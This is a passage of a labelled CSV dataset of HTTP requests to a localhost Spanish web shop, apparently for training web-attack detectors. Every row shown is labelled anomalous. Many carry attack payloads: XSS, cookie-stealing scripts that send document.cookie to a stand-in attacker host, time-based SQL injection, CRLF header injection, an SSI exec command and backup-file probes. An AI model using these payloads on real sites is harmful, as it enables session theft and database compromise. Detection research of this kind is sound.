,request,label
939,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cecelia&password=terciopelado&nombre=federica&apellidos=heusser+talo&email=sofaer@multasdetransito.cu&dni=67293578v&direccion=plza.+irantzuko+monasterioaren+63,+&ciudad=purullena&cp=41111<script>alert(""paros"");</script>&provincia=lleida&ntc=7562944888996473&b1=registrar",1
940,gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.old,1
941,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&pwd=culero&remember=on&b1=entrar,1
942,gethttp://localhost:8080/tienda1/imagenes/logo.gif/.old,1
943,gethttp://localhost:8080/iissamples/exair/funngames/funngames.asp,1
944,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=3&b1a=a�adir+al+carrito,1
945,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%20,1
946,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hutt&password=6s19r9u13o&nombre=ant�&apellidosa=laris+ull&email=behrens0@professionalhost.tr&dni=28809888l&direccion=cami+la+parra+73+&ciudad=sella&cp=39587&provincia=madrid&ntc=5101738813776143&b1=registrar,1
947,puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8506&b1=pasar+por+caja,1
948,gethttp://localhost:8080/smarticketapp/index.html,1
949,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=queso+manchego&precio=39&cantidad=64&b1=a�adir+al+carrito,1
950,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ambrosio&password=t?ub0lo6o&nombre=adonay&apellidos=castillero+minguez&emaila=gamble@viajesinternacionales.as&dni=73982596z&direccion=c/+isabel+fornieles,+168+5e&ciudad=vid+de+ojeda,+la&cp=02639&provincia=m�laga&ntc=4663857286858703&b1=registrar",1
951,gethttp://localhost:8080/tienda1/global/creditos.jsp.bak,1
952,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2@40,1
953,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=+mombour,?q&pwd=granoto&remember=on&b1=entrar",1
954,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sastry&password=3l607lado2&nombre=emmanuelle&apellidos=gonyalon+salobre�a&email=bernt@wdsl.yu&dni=82709891m&direccion=calle+poligono+san+pablo+143+6-d&ciudad=gaztelu&cpa=29711&provincia=granada&ntc=6789852392757283&b1=registrar,1
955,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=omayma&password=fr78gen5e&nombre=ro?mari&apellidos=pe�afiel&email=flagg@bacoespecialselecci�n.lb&dni=40888726q&direccion=prolongacion+jose+zorrilla+56+&ciudad=muxika&cp=06413&provincia=�vila&ntc=5771094131298411&b1=registrar,1
956,gethttp://localhost:8080/tienda1/publico/pagar.jsp.old,1
957,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=91&b1=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
958,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schwenk&password=infinitivo&nombre=tarciano','0','0');waitfor+delay+'0:0:15';--&apellidos=varela+pulido&email=strizhenova-boston@hrmsl.kh&dni=36249511q&direccion=barrio+vidal+132,+13?b&ciudad=rubite&cp=50160&provincia=zamora&ntc=6295032148467406&b1=registrar",1
959,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
960,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2579&b1a=confirmar,1
961,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=theadora&pwd=4�adi3ie8to&remember=on&b1a=entrar,1
962,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?,1
963,gethttp://localhost:8080/tienda1/imagenes/4861362529278789730~,1
964,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85/&cantidad=41&b1=a�adir+al+carrito,1
965,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=""+and+""1""=""1",1
966,gethttp://localhost:8080/tienda1/global.bak,1
967,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=39&cantidad=94&b1=a�adir+al+carrito,1
968,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=herak&password=v1373948c6a&nombre=malinda&apellidos=diclo+ornosa&email=schull@cursosenlaplaya.ro&dni=43008564j&direccion=pasaje+arcillero,+177,+2?g&ciudad=pedrosa+del+rey&cp=37874&provincia=cuenca&ntca=3359754319393302&b1=registrar",1
969,gethttp://localhost:8080/webapp/examples/errorservlet,1
970,puthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=28l3ra8a&nombre=hebelen&apellidos=fornalino+grimaldi&email=ozaki_wanamaker@travelzone.tel&dni=75981771y&direccion=calle+san+juan+bautista+de+la+salle+193+6?c&ciudad=calatorao&cp=10191&provincia=burgos&ntc=3393638948319901&b1=registrar,1
971,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
972,gethttp://localhost:8080~,1
973,gethttp://localhost:8080/tienda1/imagenes/3.gif/4861362529278789730.bak,1
974,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=85&cantidad=69&b1=a�adir+al+carrito,1
975,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=77&b1=a�adir+al+carrito,1
976,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0','0');waitfor+delay+'0:0:15';--",1
977,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beasley&pwd=narcisismo&remember=off/&b1=entrar,1
978,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=strauss&password=manirrota&nombre=dania&apellidos=alc�ce.+r&email=everrett@fernandosoto.zr&dni=34016342d&direccion=doctor+gomez+ulla,+7+13b&ciudad=boada+de+campos&cp=45573&provincia=tarragona&ntc=9293437709151698&b1=registrar",1
979,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=danzig&password=bibl7o718a24o&nombre=mardoqueo&apellidos=jaimes&emaila=coder@enmenorca.com.tn&dni=30888361m&direccion=calle+rosa+de+lima+s/n+4d&ciudad=ulea&cp=09640&provincia=c�rdoba&ntc=2914128160766490&b1=registrar,1
980,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=mamie&password=monja&nombre=ecio&apellidos=mendivil+bellv�&email=wei@alfombra.com.gw&dni=33914626e&direccion=calle+galera+7,+&ciudad=cordobilla+de+l�cara&cp=03720&provincia=santa+cruz+de+tenerife&ntc=6649652935543559&b1=registrar",1
981,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
982,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
983,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
984,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=banerjee&pwd=i1ic-�neo&remember=on&b1=entrar,1
985,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3','0','0');waitfor+delay+'0:0:15';--&nombre=jam�n+ib�rico&precio=100&cantidad=48&b1=a�adir+al+carrito",1
986,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
987,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.inc,1
988,gethttp://localhost:8080/tienda1.inc,1
989,gethttp://localhost:8080/tienda1/publico/entrar.jsp.bak,1
990,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hoeler&passworda=postremera&nombre=fructuoso&apellidos=lolli+marmol&email=dannemann@ytv.com.edu&dni=50493531k&direccion=calle+duque+de+la+riva,+67,+&ciudad=llimiana&cp=31013&provincia=c�diz&ntc=5302389212844802&b1=registrar",1
991,"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2<script>alert(""paros"");</script>",1
992,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eldin&password=b9r4enillo&nombre=rogelio&apellidos=ingla+gu-ti�r-_rez&email=rehkopf_sell@zarahealth.cy&dni=31415477f&direccion=c/+el+greco+98,+&ciudad=ll�ria&cp=34259&provincia=toledo&ntc=1530250570237050&b1=registrar",1
993,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=upchurch&password=plut�58_c5&nombre=cruz&apellidos=berengel+artigas&emaila=roudenko_sedimayr@soyvasco.ca&dni=61007775e&direccion=aromo+199,+&ciudad=poliny�&cp=37779&provincia=soria&ntc=1707059496067990&b1=registrar",1
994,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=trixi5&pwd=cel�cola&remember=offbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&b1=entrar,1
995,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kopell&password=mofl99udo&nombre=secundino&apellidos=pazar�n+totozauz&email=eustrel@cincocolores.md&dni=35507034w&direccion=c/+casal-sampaio,+24,+&ciudad=molacillos&cp=0945a&provincia=le�n&ntc=3540945192735451&b1=registrar",1
996,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
997,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=bob@<script>alert(paros)</script>.parosproxy.org,1
998,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
999,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39/&cantidad=47&b1=a�adir+al+carrito,1
1000,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.old,1
1001,gethttp://localhost:8080/tienda1/global/menum.jsp.old,1
1002,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito<script>alert(""paros"");</script>",1
1003,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar','0','0');waitfor+delay+'0:0:15';--&login=drappel&pwd=innoc52&remember=off&b1=entrar",1
1004,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
1005,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=22&b1=a�adir+al+carrito,1
1006,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eckstein&pwd=requeridor&remember=on&b1=';waitfor+delay+'0:0:15';--,1
1007,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3587&b1=pasar+por+caja/,1
1008,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&password=e!sca3zo&nombre=aixa&apellidos=lagares+planelles&email=sclommari@ceramicasmi�o.gm&dni=70803791q&direccion=plaza+santa+maria+la+rica,+77,+4d&ciudad=chalamera&cp=33777&provincia=santa+cruz+de+tenerife&ntc=1250583387066531&b1=registrar",1
1009,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
1010,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vassilik&password=d0sc3r1an76&nombre=adelmo&apellidos=capachero&email=dahl@asyra.net&dni=02792246t&direccion=c/+puentezuelas,+147,+4-b&ciudad=aizar.nazabal&cp=05500&provincia=zamora&ntc=3608872648497278&b1=registrar",1
1011,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca�o&nombre=an�car&apellidos=bastus+pellini&email=wiley@pintandomucho.va&dni=65763257r&direccion=c/+cases+noves,+98,+&ciudad=gomesende&cp=41540&provincia=�vila|&ntc=2592750778275929&b1=registrar",1
1012,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%20,1
1013,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=queso+manchego&precio=85&cantidad=95&b1=a�adir+al+carrito,1
1014,gethttp://localhost:8080/tienda1/publico/registro.jsp.inc,1
1015,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=<script>alert(""paros"");</script>&apellidos=pujos+janeiro&email=eberle@baybay.tg&dni=85025185g&direccion=de+la+vega+4,+&ciudad=casasimarro&cp=21340&provincia=a+coru�a&ntc=7642131917731646&b1=registrar",1
1016,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=and+1=1,1
1017,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dongmoon&password=setentavo&nombre=naiara&apellidos=ballester+alumbreo&email=demjanenko@gesautonomos.io&dni=56050614m&direccion=c/+colon+123,+6?c&ciudad=palau+de+sa*nta+eul�l/ia&cp=43143&provincia=lugo&ntc=6967344603029050&b1=registrar",1
1018,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=prithvi8&password=6sp51ri0a&nombre=seth&apellidos=tonsmann+puigferrer&email=mercader@pinkplanetplasencia.om&dni=52864416c&direccion=calle+la+higuerilla+32+9?h&ciudad=vegas+del+condado&cp=25790&provincia=c�ceres&ntc=%00&b1=registrar,1
1019,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif.inc,1
1020,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sparks&pwd=569t179e&remember=on/&b1=entrar,1
1021,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=raghava&passworda=e8c5mulg055r&nombre=sindulfo&apellidos=labastie+princep&email=beckley.sone@sayuela.ge&dni=96517735y&direccion=carrer+marges+174+9b&ciudad=villanueva+del+trabuco&cp=05152&provincia=tarragona&ntc=1337485764739687&b1=registrar,1
1022,gethttp://localhost:8080/asf-logo-wide,1
1023,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727,1
1024,gethttp://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp~,1
1025,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=on&b1=entrar%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
1026,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=5969&b1=confirmar,1
1027,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2any%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
1028,gethttp://localhost:8080/tienda1/4861362529278789730,1
1029,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1030,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=');waitfor+delay+'0:0:15';--,1
1031,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=raglin&password=m783a1er3&nombre=careli&apellidos=navines&email=leclerc6@soycastellano.gl&dni=52316705p&direccion=c/+tavernes+blanques,+s/n+&ciudad=p?epino&cp=21610&provincia=guip�zcoa&ntc=8201185179055303&b1=registrar",1
1032,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=austen&password=menegilda&nombre=marcia&apellidos=castelltort+trullol&email=tomchat@enhierro.com.tc&dni=74819294h&direccion=guadalete+90,+&ciudad=porto&cp=10616&provincia=segovia&ntc=122001210606787&b1=registrar",1
1033,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=katina&pwd=veneciana&remember=off/&b1=entrar,1
1034,puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jamin&pwd=contado&remember=off&b1=entrar,1
1035,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alisande6&password=aviadora&nombre=rosendo&apellidosa=schulz+de+buran&email=geldart5@corjet.hk&dni=10019031r&direccion=travesia+sacrificio+111,+7-e&ciudad=font+d'en+carr�s,+la&cp=26584&provincia=albacete&ntc=0497967469696167&b1=registrar",1
1036,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1037,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%0aset-cookie%3a+tamper%3d1041264011025374727,1
1038,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hisko&pwd=misionera&remember=off&b1=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
1039,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=<!--#exec+cmd=""ls+/""-->",1
1040,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.inc,1
1041,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1042,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4459&b1=confirmar/,1
1043,gethttp://localhost:8080/catalog.nsf,1
1044,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilkinso&password=chubasque4o&nombre=rawd,on&apellidos=bugnone&email=hartigan@porqueagel.mc&dni=54839907h&direccion=calle+san+braulio,+198+&ciudad=longares&cp=08440&provincia=burgos&ntc=3980165808897120&b1=registrar",1
1045,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2542&b1=confirmar/,1
1046,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=boehlke&pwd=retah�la&remember=off&b1=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
1047,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ozzy&pwd=respuesto&remember=on/&b1=entrar,1
1048,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=795&b1=pasar+por+caja,1
1049,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=danforth7&password=p�0o7i&nombre=liana&apellidosa=crivill�+van+derdys&email=vuosalmi.camp@risiberia.ph&dni=70627754k&direccion=calle+rosal,+42+4?d&ciudad=casas+de+don+antonio&cp=17780&provincia=segovia&ntc=8272734810678085&b1=registrar",1
1050,gethttp://localhost:8080/asf-logo-wide,1
1051,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5607&b1=pasar+por+caja/,1
1052,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=85&cantidad=4&b1a=a�adir+al+carrito,1
1053,gethttp://localhost:8080.inc,1
1054,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=lollis&pwd=7am4da&remember=off&b1=entrar,1
1055,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=guendole&password=picoteado&nombre=calixta&apellidos=bergu�o+franceschini&email=blume1@g-audi.np&dni=37147257a&direcciona=cronista+ildefonso+rodriguez+103+&ciudad=ispaster&cp=24322&provincia=zaragoza&ntc=3071106416830045&b1=registrar,1
1056,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
1057,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=glancey&password=filol�gicamente&nombre=yago&apellidos=bartra+bergu�o&email=kaminski@lola-lutscht.cf&dni=48258022c&direccion=chalets+de+la+tierruca,+118+8-f%20&ciudad=valls&cp=50691&provincia=ciudad+real&ntc=8042027288739194&b1=registrar",1
1058,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=prashant&password=l1n1sa&nombre=grey&apellidos=montaner+espinosa&email=gempart.moor@guejosgratis.br&dni=27979477t&direccion=cavad*on+49,++12h&ciudad=collbat�&cp=17180&provincia=girona&ntc=7582936564650481&b1=registrar",1
1059,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=');waitfor+delay+'0:0:15';--,1
1060,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5320&b1=confirmar'+and+'1'='1,1
